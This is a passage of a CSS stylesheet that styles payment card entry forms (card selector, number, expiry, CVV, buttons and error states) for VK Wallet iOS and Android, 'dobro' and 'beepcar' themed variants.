}

.pay-card_type_vk-wallet-ios .pay-card__row .pay-card__select-card .control-label {
	display: block
}

.pay-card_type_vk-wallet-ios .control-label__text,
.pay-card_type_vk-wallet-ios .credit-card-form__label,
.pay-card_type_vk-wallet-ios .credit-card-form__title {
	text-transform: none;
	font-size: 14px;
	color: #71757a;
	text-align: left;
	letter-spacing: -.01em;
	line-height: 18px
}

.pay-card_type_vk-wallet-ios .pay-card__select-card .control__select {
	padding-left: 68px
}

.pay-card_type_vk-wallet-ios .credit-card-form__input,
.pay-card_type_vk-wallet-ios .pay-card__select-card .control__select {
	background-color: #f2f3f5
}

.pay-card_type_vk-wallet-ios .credit-card-form__submit {
	margin: 0;
	padding-top: 10px;
	width: 100%;
	position: relative;
	left: 0;
	bottom: 0
}

.pay-card_type_vk-wallet-ios .pay-card__select-card .control__select {
	color: #f2f3f5;
	padding-left: 12px
}

.pay-card_type_vk-wallet-ios .pay-card__select-card .control__select option {
	color: #000
}

.pay-card_type_vk-wallet-ios .credit-card-form__input:focus {
	border: 1px solid #528bcc
}

.pay-card_type_vk-wallet-ios .credit-card-form__label_error_yes .credit-card-form__input:focus {
	border: 1px solid #e64646
}

.pay-card_type_vk-wallet-ios .pay-card__row .credit-card-form__error-text {
	line-height: 18px;
	margin-top: 8px
}

.pay-card_type_vk-wallet-ios .credit-card-form__label-group_type_card-number {
	margin: 0 0 26px;
	padding: 0
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup .info-block .title {
	color: #71757a;
	font-size: 14px;
	margin: 0
}

.pay-card_type_vk-wallet-ios .credit-card-form__popup .info-block .paragraph {
	font-size: 14px;
	margin: 0 0 16px
}

.pay-card_type_vk-wallet-ios.pay-card_type_submit-button-hidden .credit-card-form__submit {
	display: none
}

.pay-card_type_vk-wallet-ios.pay-card_type_submit-button-hidden .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	margin-bottom: 0
}

.secure-information_type_vk-wallet-ios.secure-information {
	background: none;
	padding: 0 12px 15px
}

.secure-information_type_vk-wallet-ios .secure-information__text {
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-size: 14px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: horizontal;
	-webkit-box-direction: normal;
	-webkit-flex-direction: row;
	flex-direction: row;
	-webkit-box-pack: start;
	-webkit-justify-content: flex-start;
	justify-content: flex-start
}

.secure-information_type_vk-wallet-ios .secure-information__text_type_secure-connection {
	color: #656565;
	font-size: 12px;
	line-height: 14px
}

.secure-information_type_vk-wallet-ios .secure-information__icon {
	display: block;
	margin: 1px 10px 0 0;
	-webkit-box-flex: 0;
	-webkit-flex: 0 0 12px;
	flex: 0 0 12px
}

.pay-card_type_vk-wallet-android {
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	margin: 0 auto;
	padding: 0 16px 15px;
	position: relative;
	width: 100%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: Roboto, sans-serif;
	font-size: 16px;
	color: #000;
	-webkit-font-smoothing: antialiased;
	height: 100%;
	min-width: 320px
}

.pay-card_type_vk-wallet-android~.credit-card-form__popup .credit-card-form__popup-body {
	height: 100%
}

.pay-card_type_vk-wallet-android .pay-card__row {
	padding: 0
}

.pay-card_type_vk-wallet-android .pay-card__card-selector {
	position: relative;
	width: auto;
	margin: 0 0 16px
}

.pay-card_type_vk-wallet-android .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_vk-wallet-android .pay-card__select-card {
	display: block
}

.pay-card_type_vk-wallet-android .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_vk-wallet-android .pay-card__select-card .control__select {
	width: 100%;
	height: 44px;
	padding: 12px;
	margin: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 6px;
	background: #fff;
	font-family: Roboto, sans-serif;
	font-size: 16px;
	color: #000;
	border-color: #d7d8d9;
	letter-spacing: -.02em;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_vk-wallet-android .pay-card__select-card .control-label {
	width: 100%;
	position: relative
}

.pay-card_type_vk-wallet-android .pay-card__select-card .control-label:after {
	position: absolute;
	top: 44px;
	content: "";
	right: 13px;
	pointer-events: none
}

.pay-card_type_vk-wallet-android .pay-card__select-card .payment-systems-icons {
	padding-left: 12px;
	top: 26px;
	right: 0;
	left: 1px;
	pointer-events: none;
	width: 85%;
	height: 42px;
	line-height: 42px;
	background-color: #f2f3f5;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center
}

.pay-card_type_vk-wallet-android .payment-systems-icons {
	position: absolute;
	top: 36px;
	right: 12px
}

.pay-card_type_vk-wallet-android .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_vk-wallet-android .payment-systems-icons .payment-systems-icon_name_visa {
	top: 0
}

.pay-card_type_vk-wallet-android .pay-card__select-card-payment-systems-icons .payment-systems-icon {
	vertical-align: middle;
	display: inline-block
}

.pay-card_type_vk-wallet-android .payment-systems-icon__text {
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	padding-left: 12px;
	letter-spacing: -.4px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	overflow: hidden
}

.pay-card_type_vk-wallet-android .payment-systems-icon__element {
	display: block;
	line-height: 1;
	height: 15px
}

.pay-card_type_vk-wallet-android .payment-systems-icon__element_type_number {
	margin-left: .25em
}

.pay-card_type_vk-wallet-android .payment-systems-icon__element_type_date {
	color: #909499;
	padding-left: 8px
}

.pay-card_type_vk-wallet-android .payment-systems-icon__element_type_text-inner {
	color: #e64646;
	padding-left: 8px
}

.pay-card_type_vk-wallet-android .pay-card__card {
	width: auto
}

.pay-card_type_vk-wallet-android .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number,
.pay-card_type_vk-wallet-android .pay-card__card_type_added-card .payment-systems-icons,
.pay-card_type_vk-wallet-android .payment-systems-icon.payment-systems-icon_disabled_yes {
	display: none
}

.pay-card_type_vk-wallet-android .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_vk-wallet-android .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_vk-wallet-android .credit-card-form__submit {
	margin: 0;
	padding-top: 8px;
	width: 100%;
	position: relative;
	left: 0;
	bottom: 0
}

.pay-card_type_vk-wallet-android .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 0 auto;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_card-number {
	margin: 0 0 12px
}

.pay-card_type_vk-wallet-android .control-label__text,
.pay-card_type_vk-wallet-android .credit-card-form__title {
	display: block;
	margin: 0 0 8px;
	text-transform: none;
	color: #71757a;
	font-size: 14px;
	letter-spacing: -.02em
}

.pay-card_type_vk-wallet-android .credit-card-form__input {
	-webkit-tap-highlight-color: transparent;
	height: 44px;
	background: #fff;
	border-color: #d7d8d9;
	color: #000;
	border-radius: 6px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 16px;
	padding-left: 12px;
	letter-spacing: -.02em
}

.pay-card_type_vk-wallet-android .credit-card-form__input::-webkit-input-placeholder {
	color: #aaaeb3;
	text-transform: none;
	letter-spacing: -.02em;
	font-size: 16px
}

.pay-card_type_vk-wallet-android .credit-card-form__input::-moz-placeholder {
	color: #aaaeb3;
	text-transform: none;
	letter-spacing: -.02em;
	font-size: 16px
}

.pay-card_type_vk-wallet-android .credit-card-form__input::placeholder {
	color: #aaaeb3;
	text-transform: none;
	letter-spacing: -.02em;
	font-size: 16px
}

.chrome .pay-card_type_vk-wallet-android .credit-card-form__input_type_protected::-webkit-input-placeholder {
	-webkit-transform: translateY(-3px);
	transform: translateY(-3px)
}

.chrome .pay-card_type_vk-wallet-android .credit-card-form__input_type_protected::-moz-placeholder {
	transform: translateY(-3px)
}

.chrome .pay-card_type_vk-wallet-android .credit-card-form__input_type_protected::placeholder {
	-webkit-transform: translateY(-3px);
	-o-transform: translateY(-3px);
	transform: translateY(-3px)
}

.pay-card_type_vk-wallet-android .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-wallet-android .credit-card-form__input:disabled {
	color: #71757a;
	opacity: 1
}

.pay-card_type_vk-wallet-android .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_expiration-date {
	margin: 0;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	float: none;
	margin-bottom: 16px;
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding-right: 6px
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 100%
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
	margin: 0;
	width: 100%
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	padding: 0 0 0 6px;
	position: relative
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_one-column .credit-card-form__label_type_cvv {
	padding-left: 0
}

.pay-card_type_vk-wallet-android .credit-card-form_single-side_yes .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

.pay-card_type_vk-wallet-android .credit-card-form__cvv-icon,
.pay-card_type_vk-wallet-android .credit-card-form__cvv-icon:hover,
.pay-card_type_vk-wallet-android .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	border: 7px solid #f2f3f5;
	-webkit-tap-highlight-color: transparent;
	border-radius: 10px;
	top: 30px;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	position: absolute;
	left: auto;
	right: 5px;
	text-align: center;
	cursor: pointer
}

.pay-card_type_vk-wallet-android .credit-card-form__cvv-icon:focus,
.pay-card_type_vk-wallet-android .credit-card-form__cvv-icon:hover:focus,
.pay-card_type_vk-wallet-android .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon:focus {
	outline: none
}

.pay-card_type_vk-wallet-android .credit-card-form__cvv-icon:before,
.pay-card_type_vk-wallet-android .credit-card-form__cvv-icon:hover:before,
.pay-card_type_vk-wallet-android .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon:before {
	display: none
}

.pay-card_type_vk-wallet-android .credit-card-form__label_error_yes .credit-card-form__cvv-icon,
.pay-card_type_vk-wallet-android .credit-card-form__label_error_yes .credit-card-form__cvv-icon:hover,
.pay-card_type_vk-wallet-android .credit-card-form__label_error_yes.credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	display: block;
	border-color: #faeaea
}

.pay-card_type_vk-wallet-android .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card_type_vk-wallet-android .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_vk-wallet-android .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card_type_vk-wallet-android .credit-card-form__error-text {
	position: static;
	font-size: 14px;
	color: #e64646
}

.pay-card_type_vk-wallet-android .credit-card-form_single-side_yes .credit-card-form__label_type_cvv .credit-card-form__error-text {
	width: auto
}

.pay-card_type_vk-wallet-android .credit-card-form_single-side_yes .credit-card-form__label_type_cvv.credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card_type_vk-wallet-android .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	background-color: #faeaea;
	border: 1px solid #e64646
}

.pay-card_type_vk-wallet-android .credit-card-form__popup {
	margin: 0 auto
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .button,
.pay-card_type_vk-wallet-android .credit-card-form__submit .button {
	font-family: Roboto, sans-serif;
	font-weight: 500;
	margin: 0;
	padding: 0;
	text-transform: none
}

.pay-card_type_vk-wallet-android .credit-card-form__submit .button {
	-webkit-tap-highlight-color: transparent;
	color: #fff;
	border-radius: 4px;
	width: 100%;
	height: 44px;
	line-height: 44px;
	font-size: 16px;
	letter-spacing: -.02em;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	text-transform: none
}

.pay-card_type_vk-wallet-android .credit-card-form__submit .button,
.pay-card_type_vk-wallet-android .credit-card-form__submit .button:active,
.pay-card_type_vk-wallet-android .credit-card-form__submit .button:hover {
	background: #5181b8
}

.pay-card_type_vk-wallet-android .credit-card-form__submit .button:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_vk-wallet-android .credit-card-form__submit .button.button_disabled_yes {
	-webkit-tap-highlight-color: transparent
}

.pay-card_type_vk-wallet-android .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_vk-wallet-android .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_vk-wallet-android .credit-card-form__submit .button.button_disabled_yes:hover {
	background: rgba(81, 129, 184, .4);
	color: #fff;
	cursor: default
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .button {
	-webkit-tap-highlight-color: transparent;
	border-radius: 4px;
	font-size: 14px;
	line-height: 30px;
	width: 175px;
	height: 30px
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .button,
.pay-card_type_vk-wallet-android .credit-card-form__popup .button:hover {
	background: rgba(0, 57, 115, .1);
	color: #45678f
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .button:active {
	background: #cbd7e2
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .button.button_disabled_yes {
	-webkit-tap-highlight-color: transparent;
	border-radius: 4px
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_vk-wallet-android .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_vk-wallet-android .credit-card-form__popup .button.button_disabled_yes:hover {
	background: rgba(0, 57, 115, .05);
	color: rgba(69, 103, 143, .4);
	cursor: default
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .info-block .title,
.pay-card_type_vk-wallet-android .notification-block .title {
	margin: 0 0 12px;
	font-size: 17px;
	color: #71757a
}

.pay-card_type_vk-wallet-android .notification-block__inner {
	padding: 0
}

.pay-card_type_vk-wallet-android .credit-card-form__popup-footer {
	height: auto
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .info-block .paragraph,
.pay-card_type_vk-wallet-android .info-block .paragraph {
	margin: 0;
	font-size: 14px;
	color: #71757a
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .info-block .paragraph_color_red {
	color: #71757a
}

.pay-card_type_vk-wallet-android .credit-card-form__tooltip {
	height: 53px;
	top: -28px;
	width: auto;
	width: 206px;
	line-height: 18px;
	white-space: normal;
	border: none;
	left: auto;
	right: 0;
	padding: 9px 10px 9px 16px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #fff;
	-webkit-box-shadow: 2px 3px 18px 11px rgba(0, 0, 0, .05), 0 2px 2px 0 rgba(0, 0, 0, .1), 0 3px 1px 0 rgba(0, 0, 0, .05);
	box-shadow: 2px 3px 18px 11px rgba(0, 0, 0, .05), 0 2px 2px 0 rgba(0, 0, 0, .1), 0 3px 1px 0 rgba(0, 0, 0, .05);
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	font-family: Arial, Tahoma, Verdana, sans-serif;
	text-align: left;
	color: #2c2d2e;
	letter-spacing: -.02em
}

.pay-card_type_vk-wallet-android .credit-card-form__tooltip .credit-card-form__tooltip-arrow {
	top: 94%;
	bottom: -16px;
	right: 14px;
	border: solid transparent;
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: #fff;
	border-width: 8px;
	margin-left: 0
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_one-column .credit-card-form__tooltip {
	right: -webkit-calc(-206px + 100%);
	right: calc(-206px + 100%)
}

@media (min-width:467px) {
	.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_one-column .credit-card-form__tooltip {
		right: 0
	}
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_one-column .credit-card-form__tooltip-arrow {
	left: -webkit-calc(50vw - 47px);
	left: calc(50vw - 47px)
}

@media (max-width:320px) {
	.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_one-column .credit-card-form__tooltip-arrow {
		left: 112px
	}
}

@media (min-width:454px) {
	.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_one-column .credit-card-form__tooltip-arrow {
		right: 16px;
		left: auto
	}
}

.pay-card_type_vk-wallet-android .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_vk-wallet-android .credit-card-form__popup-body {
	height: auto
}

.pay-card_type_vk-wallet-android .credit-card-form__popup {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	-webkit-box-pack: center;
	-webkit-justify-content: center;
	justify-content: center
}

.pay-card_type_vk-wallet-android .pay-card__row,
.pay-card_type_vk-wallet-android .pay-card__row .pay-card__select-card .control-label {
	display: block
}

.pay-card_type_vk-wallet-android .control_layout_horizontal .control-label__text,
.pay-card_type_vk-wallet-android .control_layout_horizontal .control__input,
.pay-card_type_vk-wallet-android .control_layout_horizontal .control__select {
	float: none
}

.pay-card_type_vk-wallet-android .control-label__text,
.pay-card_type_vk-wallet-android .credit-card-form__label,
.pay-card_type_vk-wallet-android .credit-card-form__title {
	text-transform: none;
	font-size: 14px;
	color: #71757a;
	letter-spacing: -.01em;
	line-height: 18px
}

.pay-card_type_vk-wallet-android .pay-card__select-card .control__select {
	padding-left: 68px
}

.pay-card_type_vk-wallet-android .credit-card-form__label .credit-card-form__input,
.pay-card_type_vk-wallet-android .pay-card__select-card .control__select {
	line-height: 24px;
	font-family: Roboto, sans-serif;
	border-radius: 4px;
	border: none;
	background: #f2f3f5 -webkit-linear-gradient(bottom, #d4d5d7 2px, transparent 0);
	background: #f2f3f5 -o-linear-gradient(bottom, #d4d5d7 2px, transparent 2px);
	background: #f2f3f5 linear-gradient(0deg, #d4d5d7 2px, transparent 0)
}

.pay-card_type_vk-wallet-android .credit-card-form__input::-webkit-input-placeholder,
.pay-card_type_vk-wallet-android .pay-card__select-card .control__select::-webkit-input-placeholder {
	font-weight: 400;
	font-size: 16px;
	line-height: 20px;
	font-family: Roboto, sans-serif;
	color: #909499
}

.pay-card_type_vk-wallet-android .credit-card-form__input::-moz-placeholder,
.pay-card_type_vk-wallet-android .pay-card__select-card .control__select::-moz-placeholder {
	font-weight: 400;
	font-size: 16px;
	line-height: 20px;
	font-family: Roboto, sans-serif;
	color: #909499
}

.pay-card_type_vk-wallet-android .credit-card-form__input::placeholder,
.pay-card_type_vk-wallet-android .pay-card__select-card .control__select::placeholder {
	font-weight: 400;
	font-size: 16px;
	line-height: 20px;
	font-family: Roboto, sans-serif;
	color: #909499
}

.pay-card_type_vk-wallet-android .credit-card-form__label_error_yes .credit-card-form__input,
.pay-card_type_vk-wallet-android .credit-card-form__label_error_yes .credit-card-form__input:focus {
	background: #faeaea -webkit-linear-gradient(bottom, #e69393 2px, transparent 0);
	background: #faeaea -o-linear-gradient(bottom, #e69393 2px, transparent 2px);
	background: #faeaea linear-gradient(0deg, #e69393 2px, transparent 0)
}

.pay-card_type_vk-wallet-android .credit-card-form__input:focus {
	background: #f2f3f5 -webkit-linear-gradient(bottom, #528bcc 2px, transparent 0);
	background: #f2f3f5 -o-linear-gradient(bottom, #528bcc 2px, transparent 2px);
	background: #f2f3f5 linear-gradient(0deg, #528bcc 2px, transparent 0)
}

.pay-card_type_vk-wallet-android .pay-card__select-card .control__select {
	color: #f2f3f5;
	padding-left: 12px
}

.pay-card_type_vk-wallet-android .pay-card__select-card .control__select option {
	color: #000
}

.pay-card_type_vk-wallet-android .pay-card__row .credit-card-form__error-text {
	line-height: 18px;
	margin-top: 8px
}

.pay-card_type_vk-wallet-android .credit-card-form__label-group_type_card-number {
	padding: 0;
	margin: 0 0 16px
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .info-block .paragraph,
.pay-card_type_vk-wallet-android .credit-card-form__popup .info-block .title,
.pay-card_type_vk-wallet-android .info-block__text {
	font-family: Roboto, sans-serif;
	font-size: 14px
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .info-block .title {
	margin: 0
}

.pay-card_type_vk-wallet-android .credit-card-form__popup .info-block .paragraph {
	margin: 0 0 16px
}

.pay-card_type_vk-wallet-android .info-block__text {
	font-weight: 400;
	line-height: 20px
}

.pay-card_type_vk-wallet-android.pay-card_type_submit-button-hidden .credit-card-form__submit {
	display: none
}

.pay-card_type_vk-wallet-android.pay-card_type_submit-button-hidden .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	margin-bottom: 0
}

.secure-information_type_vk-wallet-android.secure-information {
	background: none;
	padding: 0 16px 15px
}

.secure-information_type_vk-wallet-android .secure-information__text {
	font-family: Roboto, sans-serif;
	font-size: 14px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: horizontal;
	-webkit-box-direction: normal;
	-webkit-flex-direction: row;
	flex-direction: row;
	-webkit-box-pack: start;
	-webkit-justify-content: flex-start;
	justify-content: flex-start
}

.secure-information_type_vk-wallet-android .secure-information__text_type_secure-connection {
	color: #656565;
	font-size: 12px;
	line-height: 16px
}

.secure-information_type_vk-wallet-android .secure-information__icon {
	display: block;
	margin: 1px 10px 0 0;
	-webkit-box-flex: 0;
	-webkit-flex: 0 0 12px;
	flex: 0 0 12px
}

.pay-card_type_dobro {
	-webkit-font-smoothing: antialiased
}

.pay-card_type_dobro .credit-card-form__popup .button,
.pay-card_type_dobro .credit-card-form__submit .button {
	color: #000;
	border: 1px solid #e0bb00;
	border-radius: 4px;
	background: #ffd400;
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	height: 40px;
	line-height: 40px;
	font-size: 15px;
	font-weight: 400;
	padding: 0 20px;
	text-transform: none
}

.pay-card_type_dobro .credit-card-form__popup .button:hover,
.pay-card_type_dobro .credit-card-form__submit .button:hover {
	background: #f2c900
}

.pay-card_type_dobro .credit-card-form__popup .button:active,
.pay-card_type_dobro .credit-card-form__submit .button:active {
	background: #ffd400
}

.pay-card_type_dobro .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_dobro .credit-card-form__submit .button.button_disabled_yes {
	border-radius: 4px
}

.pay-card_type_dobro .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_dobro .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_dobro .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_dobro .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_dobro .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_dobro .credit-card-form__submit .button.button_disabled_yes:hover {
	color: #000;
	background: #f0f0f0;
	border: 1px solid #d3d3d3;
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	cursor: default
}

.pay-card_type_dobro .credit-card-form__submit {
	padding-bottom: 5px
}

.body_background_beepcar,
.pay-card-layout_type_beepcar .credit-card-form__popup,
.pay-card-layout_type_beepcar .credit-card-form__popup .notification-block {
	background: #f9f9f9
}

.pay-card-layout_type_beepcar {
	padding-bottom: 15px
}

.pay-card_type_beepcar {
	position: static;
	width: 100%;
	max-width: 360px;
	margin: 0 auto 10px;
	padding: 5px 15px 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: Roboto, arial, helvetica;
	font-size: 14px;
	line-height: 22px;
	color: #8f8f8f;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_beepcar .pay-card__card-selector {
	position: relative;
	width: auto;
	margin: 0
}

.pay-card_type_beepcar .pay-card__select-card {
	display: block
}

.pay-card_type_beepcar .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_beepcar .pay-card__select-card .control__select {
	width: 100%;
	height: 48px;
	padding: 4px 10px;
	margin: 0 0 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 4px;
	background: #fff;
	font-family: Roboto, arial, helvetica;
	font-size: 16px;
	color: #2a2a2a;
	border-color: #e1e3e5
}

.pay-card_type_beepcar .pay-card__remove-card {
	display: inline-block;
	margin: 0 0 15px;
	color: #24d07a;
	line-height: 18px
}

.pay-card_type_beepcar .pay-card__remove-card-icon {
	display: none
}

.pay-card_type_beepcar .pay-card__card {
	width: auto
}

.pay-card_type_beepcar .pay-card__card_type_added-card {
	padding-top: 0
}

.pay-card_type_beepcar .pay-card__card_type_added-card .credit-card-form__label-group_type_add-card,
.pay-card_type_beepcar .pay-card__card_type_added-card .credit-card-form__label-group_type_card-number {
	display: none
}

.pay-card_type_beepcar .pay-card__card_type_added-card .payment-systems-icons {
	top: -120px
}

.pay-card_type_beepcar .pay-card__message {
	text-align: left
}

.pay-card_type_beepcar .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_beepcar .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_beepcar .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: auto;
	margin: 0 auto 10px;
	padding: 0;
	background: none;
	border-radius: 0;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_beepcar .payment-systems-icons {
	position: absolute;
	right: 0;
	top: 3px
}

.pay-card_type_beepcar .payment-systems-icon {
	margin: 0 0 0 5px;
	float: right
}

.pay-card_type_beepcar .credit-card-form__label-group_type_card-number {
	clear: both;
	margin: 0 0 15px
}

.pay-card_type_beepcar .control-label__text,
.pay-card_type_beepcar .credit-card-form__title {
	display: block;
	margin: 0 0 5px;
	text-transform: none;
	font-size: 14px;
	color: #8f8f8f;
	line-height: 1.57
}

.pay-card_type_beepcar .credit-card-form__input {
	height: 48px;
	background: #fff;
	border-color: #e1e3e5;
	color: #2a2a2a;
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 16px;
	padding-left: 12px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_beepcar .credit-card-form__input::-webkit-input-placeholder {
	color: #c6c6c6;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_beepcar .credit-card-form__input::-moz-placeholder {
	color: #c6c6c6;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_beepcar .credit-card-form__input::placeholder {
	color: #c6c6c6;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_beepcar .credit-card-form__label-group_type_add-card {
	margin: 0 0 20px
}

.pay-card_type_beepcar .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 14px
}

.pay-card_type_beepcar .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card_type_beepcar [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin: -3px 10px 0 0;
	padding: 3px;
	vertical-align: top;
	width: 14px;
	height: 14px;
	border: 1px solid #e1e3e5;
	border-radius: 4px;
	background: #fff
}

.pay-card_type_beepcar [type=checkbox]:checked+.credit-card-form__input-icon {
	border-color: #e1e3e5
}

.pay-card_type_beepcar [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 5px;
	height: 9px;
	border: solid #24d07a;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_beepcar .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_beepcar .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_beepcar .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding-right: 6px
}

.pay-card_type_beepcar .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_beepcar .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 100%
}

.pay-card_type_beepcar .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	margin: 0;
	padding: 0 0 0 6px;
	position: relative
}

.pay-card_type_beepcar .credit-card-form__cvv-icon,
.pay-card_type_beepcar .credit-card-form__cvv-icon:hover,
.pay-card_type_beepcar .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	height: 20px;
	width: 20px
}

.pay-card_type_beepcar .credit-card-form__cvv-icon {
	position: absolute;
	display: inline-block;
	top: 42px;
	left: auto;
	right: 15px;
	border-radius: 10px;
	background-image: none;
	background-color: #ccc;
	text-align: center;
	color: #fff;
	cursor: pointer
}

.pay-card_type_beepcar .credit-card-form__cvv-icon:before {
	display: inline-block;
	content: "?";
	font-size: 15px;
	line-height: 15px
}

.pay-card_type_beepcar .credit-card-form__terms {
	font-size: 14px;
	line-height: 22px;
	color: #8f8f8f
}

.pay-card_type_beepcar .credit-card-form__terms-link {
	color: #24d07a
}

.pay-card_type_beepcar .credit-card-form__error-text,
.pay-card_type_beepcar .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

